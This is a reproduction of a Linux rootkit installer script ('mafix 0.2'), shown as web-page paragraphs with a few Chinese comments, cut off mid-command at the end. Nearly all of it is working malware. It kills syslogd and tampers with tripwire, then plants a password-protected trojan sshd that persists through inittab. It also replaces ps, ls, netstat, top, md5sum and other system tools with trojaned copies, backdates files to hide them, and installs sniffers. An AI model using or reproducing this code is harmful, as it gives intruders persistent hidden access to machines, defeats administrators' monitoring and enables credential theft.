&nbsp;</p><p>---root</p><p>&nbsp;</p><p>下面为root的内容，也就是安装脚本。</p><p>#!/bin/bash</p><p>######################</p><p># mafix 0.2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#</p><p># fud 2009/07/15 &nbsp; &nbsp; #</p><p>######################</p><p>&nbsp;</p><p>BASEDIR=`pwd`</p><p>export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</p><p>BLK=' [1;30m'</p><p>MAG=' [1;35m'</p><p>CYN=' [1;30m'</p><p>RED='^[[1;32m'</p><p>DMAG=' [1;37m'</p><p>RES=' [0m'</p><p>&nbsp;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG}- the ferrari of rootkits - ${RES}&quot;</p><p>sleep 5</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} extracting libs...${RES}&quot;</p><p>tar zxf mafixlibs</p><p>if [ &quot;$(whoami)&quot; != &quot;root&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} you need to be root to backdoor the box...${RES}&quot;</p><p>&nbsp; &nbsp;exit</p><p>fi</p><p>cd $BASEDIR</p><p>sleep 1</p><p>killall -9 syslogd &gt;/dev/null 2&gt;&amp;1</p><p>startime=`date +%S`</p><p>&nbsp;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdooring box...${RES}&quot;</p><p>SYSLOGCONF=&quot;/etc/syslog.conf&quot;</p><p>REMOTE=`grep -v &quot;^#&quot; &quot;$SYSLOGCONF&quot; | grep -v &quot;^$&quot; | grep &quot;@&quot; | cut -d '@' -f 2`</p><p>if [ ! -z &quot;$REMOTE&quot; ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Remote logging found! I hope you got access to these box:${RES}&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; for host in $REMOTE; do</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo -n &quot; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&quot;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo $host</p><p>&nbsp; &nbsp; &nbsp; &nbsp; done</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo ' ${CYN}coz this box is logging to it${RES}'</p><p>&nbsp; &nbsp; &nbsp; &nbsp; echo</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no remote logging found...${RES}&quot;</p><p>fi</p><p>uname=`uname -n`</p><p>twd=/var/lib/tripwire/$uname.twd</p><p>if [ -d /etc/tripwire ]; then</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WARNING: TRIPWIRE FOUND!${RES}&quot;</p><p>if [ -f /var/lib/tripwire/$uname.twd ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa $twd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#去保护，如果有的话，覆盖，chattr +isa 写保护</p><p>&nbsp; &nbsp;else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire db found...${RES}&quot;</p><p>&nbsp; &nbsp;fi</p><p>else</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} no tripwire was detected..${RES}&quot;</p><p>fi</p><p># restoring login</p><p>if [ -f /sbin/xlogin ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/xlogin</p><p>&nbsp; &nbsp;chattr -isa /bin/login</p><p>&nbsp; &nbsp;mv -f /sbin/xlogin /bin/login</p><p>&nbsp; &nbsp;chmod 7455 /bin/login</p><p>&nbsp; &nbsp;chattr +isa /bin/login</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} installing trojans...${RES}&quot;</p><p>if [ -f /etc/sh.conf ]; then</p><p>&nbsp; chattr -isa /etc/sh.conf</p><p>&nbsp; rm -rf /etc/sh.conf</p><p>fi</p><p># checking if we got needed libs and filez</p><p>if [ ! -f /lib/libproc.a ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.a /lib/ 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ ! -f /lib/libproc.so.2.0.6 ]; then</p><p>&nbsp; &nbsp;mv bin/lib/libproc.so.2.0.6 /lib/ 2&gt;/dev/null</p><p>fi</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} hold on...${RES}&quot;</p><p>/sbin/ldconfig &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>if [ ! -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;touch -acmr /bin/ls bin/md5sum</p><p>&nbsp; &nbsp;cp bin/md5sum /usr/bin/md5sum</p><p>fi</p><p>DEFPASS=race</p><p>DEFPORT=11111</p><p>if test -n &quot;$1&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $1${RES}&quot;</p><p>&nbsp; &nbsp;cd $BASEDIR/bin</p><p>&nbsp; &nbsp;echo -n $1|md5sum &gt; /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#生成密码文件</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPASS${RES}&quot;</p><p>&nbsp; &nbsp;echo -n $DEFPASS|md5sum &gt; /etc/sh.conf</p><p>fi</p><p>&nbsp;</p><p>touch -acmr /bin/ls /etc/sh.conf</p><p>chown -f root:root /etc/sh.conf</p><p>chattr +isa /etc/sh.conf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#写保护</p><p>&nbsp;</p><p>if test -n &quot;$2&quot; ; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Port:${DMAG} $2${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $2&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $BASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>else</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} Password:${DMAG} $DEFPORT${RES}&quot;</p><p>&nbsp; &nbsp;echo &quot;Port $DEFPORT&quot; &gt;&gt; $BASEDIR/bin/.sh/sshd_config</p><p>&nbsp;&nbsp;</p><p>&nbsp; &nbsp;echo &quot;3 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;echo &quot;4 $2&quot; &gt;&gt; $BASEDIR/bin/headers/hosts.h</p><p>&nbsp; &nbsp;cat $BASEDIR/bin/.sh/shdcf2 &gt;&gt; $BASEDIR/bin/.sh/sshd_config ; rm -rf $B\nASEDIR/bin/.sh/shdcf2</p><p>&nbsp; &nbsp;mv $BASEDIR/bin/.sh/sshd_config $BASEDIR/bin/.sh/shdcf 2&gt;/dev/null</p><p>fi</p><p>&nbsp;</p><p>if [ -f /lib/lidps1.so ]; then</p><p>&nbsp; chattr -isa /lib/lidps1.so</p><p>&nbsp; rm -rf /lib/lidps1.so</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/hosts.h ]; then</p><p>&nbsp; chattr -isa /usr/include/hosts.h</p><p>&nbsp; rm -rf /usr/include/hosts.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/file.h ]; then</p><p>&nbsp; chattr -isa /usr/include/file.h</p><p>&nbsp; rm -rf /usr/include/file.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/log.h ]; then</p><p>&nbsp; chattr -isa /usr/include/log.h</p><p>&nbsp; rm -rf /usr/include/log.h</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/include/proc.h ]; then</p><p>&nbsp; chattr -isa /usr/include/proc.h</p><p>&nbsp; rm -rf /usr/include/proc.h</p><p>fi</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>mv $BASEDIR/bin/headers/lidps1.so /lib/lidps1.so 2&gt;/dev/null</p><p>touch -acmr /bin/ls /lib/lidps1.so &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #修改文件时间与/bin/ls 时间相同</p><p>touch -acmr /bin/ls $BASEDIR/bin/headers/* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#修改时间</p><p>mv $BASEDIR/bin/headers/* &nbsp;/usr/include/ 2&gt;/dev/null</p><p>&nbsp;</p><p># Ok lets start creating dirs</p><p>&nbsp;</p><p>SSHDIR=/lib/libsh.so</p><p>HOMEDIR=/usr/lib/libsh</p><p>&nbsp;</p><p>if [ -d /lib/libsh.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so</p><p>&nbsp; &nbsp;chattr -isa /lib/libsh.so/*</p><p>&nbsp; &nbsp;rm -rf /lib/libsh.so</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/lib/libsh ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh</p><p>&nbsp; &nbsp;chattr -isa /usr/lib/libsh/*</p><p>&nbsp; &nbsp;rm -rf /usr/lib/libsh/*</p><p>fi</p><p>&nbsp;</p><p>mkdir $SSHDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $SSHDIR</p><p>mkdir $HOMEDIR 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>mv .sh/* $SSHDIR/ 2&gt;/dev/null</p><p>mv .sh/.bashrc $HOMEDIR 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/ttyload ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/ttyload</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/ttyload</p><p>fi</p><p>&nbsp;</p><p>if [ -f /sbin/ttymon ]; then</p><p>&nbsp; &nbsp;chattr -isa /sbin/ttymon</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttyload 2&gt;/dev/null</p><p>chmod o-w /sbin/ttyload 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>chattr +isa /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttymon 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>chattr +isa /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p># INITTAB SHUFFLING</p><p>&nbsp;</p><p>chattr -isa /etc/inittab</p><p>cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1</p><p>cat /etc/inittab |grep getty &gt; /tmp/.init2</p><p>echo &quot;# Loading standard ttys&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p><p>cat /tmp/.init2 &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# modem getty.&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# fax getty (hylafax)&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# vbox (voice box) getty&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# end of /etc/inittab&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;/sbin/ttyload -q &gt;/dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod +x /usr/sbin/ttyload 2&gt;/dev/null</p><p>chattr +isa /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /etc/inittab /tmp/.init1</p><p>mv -f /tmp/.init1 /etc/inittab 2&gt;/dev/null</p><p>rm -rf /tmp/.init2</p><p>&nbsp;</p><p># MAKING SURE WE GOT IT BACKDORED RIGHT !</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} inittab broken, sshd wont be loaded upon reboot :(${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p># Say hello to md5sum fixer boys n gurls !</p><p>&nbsp;</p><p>if [ -f /sbin/ifconfig ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /sbin/ifconfig &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ps &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ls ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ls &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/netstat ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/netstat &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/find &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/top &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/sbin/lsof &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/slocate &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/dir &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/md5sum &gt;&gt; .shmd5</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ ! -f /dev/srd0 ]; then</p><p>&nbsp; ./encrypt -e .shmd5 /dev/srd0</p><p>&nbsp; touch -acmr /bin/ls /dev/srd0</p><p>&nbsp; chattr a+r /dev/srd0</p><p>&nbsp; chown -f root:root /dev/srd0</p><p>fi</p><p>&nbsp;</p><p>rm -rf .shmd5</p><p>&nbsp;</p><p>&nbsp;</p><p># time change bitch</p><p>&nbsp;</p><p>touch -acmr /sbin/ifconfig ifconfig &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ps ps &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ls ls &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/netstat netstat &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/find find &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/top top &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/sbin/lsof lsof &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /sbin/syslogd syslogd &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/slocate slocate &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/dir dir &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/md5sum md5sum &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/pstree pstree &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p># Backdoor ps/top/du/ls/netstat/etc..</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>&nbsp;</p><p>BACKUP=/usr/lib/libsh/.backup</p><p>mkdir $BACKUP 2&gt;/dev/null</p><p>&nbsp;</p><p># ps ...</p><p>if [ -f /usr/bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ps</p><p>&nbsp; &nbsp;cp /usr/bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /usr/bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/ps</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/ps</p><p>&nbsp; &nbsp;cp /bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /bin/ps</p><p>fi</p><p>&nbsp;</p><p># ifconfig ...</p><p>chattr -isa /sbin/ifconfig</p><p>cp /sbin/ifconfig $BACKUP</p><p>mv -f ifconfig /sbin/ifconfig 2&gt;/dev/null</p><p>chattr +isa\n/sbin/ifconfig</p><p>&nbsp;</p><p># netstat ...</p><p>if [ -f /usr/sbin/netstat ]; then</p><p>&nbsp; chattr -isa /usr/sbin/netstat</p><p>&nbsp; mv -f netstat /usr/sbin/netstat 2&gt;/dev/null</p><p>&nbsp; chattr +isa /usr/sbin/netstat</p><p>fi</p><p>&nbsp;</p><p>chattr -isa /bin/netstat</p><p>cp /bin/netstat $BACKUP</p><p>mv -f netstat /bin/netstat 2&gt;/dev/null</p><p>chattr +isa /bin/netstat</p><p>&nbsp;</p><p># top ...</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/top</p><p>&nbsp; &nbsp;cp /usr/bin/top $BACKUP</p><p>&nbsp; &nbsp;mv -f top /usr/bin/top 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/top</p><p>&nbsp; &nbsp;if [ -f /lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;if [ -f /usr/lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /usr/lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>fi</p><p>&nbsp;</p><p># slocate ...</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/slocate</p><p>&nbsp; &nbsp;cp /usr/bin/slocate $BACKUP</p><p>&nbsp; &nbsp;mv -f slocate /usr/bin/slocate 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/slocate</p><p>fi</p><p>&nbsp;</p><p># ls ...</p><p>chattr -isa /bin/ls</p><p>cp /bin/ls $BACKUP</p><p>mv -f ls /bin/ls 2&gt;/dev/null</p><p>chattr +isa /bin/ls</p><p>&nbsp;</p><p># find ...</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/find</p><p>&nbsp; &nbsp;cp /usr/bin/find $BACKUP</p><p>&nbsp; &nbsp;mv -f find /usr/bin/find 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/find</p><p>fi</p><p>&nbsp;</p><p># dir ...</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/dir</p><p>&nbsp; &nbsp;cp /usr/bin/dir $BACKUP</p><p>&nbsp; &nbsp;mv -f dir /usr/bin/dir 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/dir</p><p>fi</p><p>&nbsp;</p><p># lsof ...</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/lsof</p><p>&nbsp; &nbsp;cp /usr/sbin/lsof $BACKUP</p><p>&nbsp; &nbsp;mv -f lsof /usr/sbin/lsof 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/sbin/lsof</p><p>fi</p><p>&nbsp;</p><p># pstree ...</p><p>if [ -f /usr/bin/pstree ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/pstree</p><p>&nbsp; &nbsp;cp /usr/bin/pstree $BACKUP</p><p>&nbsp; &nbsp;mv -f pstree /usr/bin/pstree 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/pstree</p><p>fi</p><p>&nbsp;</p><p># md5sum ...</p><p>chattr -isa /usr/bin/md5sum</p><p>cp /usr/bin/md5sum $BACKUP</p><p>mv -f md5sum /usr/bin/md5sum 2&gt;/dev/null</p><p>chattr +isa /usr/bin/md5sum</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdoored some daemons (netstat, ps)${RES}&quot;</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.sniff 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff 2&gt;/dev/null</p><p>chmod +x $BASEDIR/bin/sshd 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsb $HOMEDIR/shsb 2&gt;/dev/null</p><p>mv $BASEDIR/bin/hide $HOMEDIR/hide 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shp</p><p>touch -acmr /bin/ls $HOMEDIR/shsb</p><p>touch -acmr /bin/ls $HOMEDIR/hide</p><p>chmod +x $HOMEDIR/.sniff/* 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/shsb 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/hide 2&gt;/dev/null</p><p>./bin/sshd $1 $2 &gt;&gt; /dev/null</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} checking for some vuln daemons....${RES}&quot;</p><p>ps aux &gt; /tmp/.procs</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep named`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} NAMED FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/wu.ftpd ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WU-FTPD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep smbd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} SAMBA FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep rpc.statd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} RPC.STATD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.procs</p><p>&nbsp;</p><p>netstat -natp &gt; /tmp/.stats</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.stats | grep 443 | grep http`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} MOD_SSL FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.stats</p><p>&nbsp;</p><p>&nbsp;</p><p># CHECKING FOR HOSTILE ROOTKITS/BACKDORS</p><p>&nbsp;</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.owned 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /etc/ttyhash ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /etc/ttyhash</p><p>&nbsp; &nbsp;rm -rf 